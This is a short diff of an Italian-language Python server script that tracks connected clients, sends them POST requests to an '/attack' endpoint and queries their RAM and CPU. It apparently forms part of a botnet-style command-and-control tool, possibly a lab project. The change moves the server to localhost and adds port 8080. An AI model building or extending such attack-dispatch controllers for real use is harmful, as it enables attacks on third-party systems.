@@ -5,8 +5,8 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 
-server_address = ('10.0.2.15', 15200)
-# server_address = ('localhost', 15200)
+# server_address = ('10.0.2.15', 15200)
+server_address = ('localhost', 15200)
 clients = []
 
 
@@ -140,7 +140,7 @@ def send_http_request():
         print("Nessun client connesso")
         return
 
-    res = requests.post(f"http://{clients[0][1][0]}/attack", json=post_data)
+    res = requests.post(f"http://{clients[0][1][0]}:8080/attack", json=post_data)
 
     print(res)
 
@@ -166,7 +166,7 @@ def get_client_info():
         print("Nessun client connesso")
         return
 
-    res = requests.get(f"http://{clients[0][1][0]}/client-info")
+    res = requests.get(f"http://{clients[0][1][0]}:8080/client-info")
 
     ram = res.json()['ram']
     cpu = res.json()['cpu']
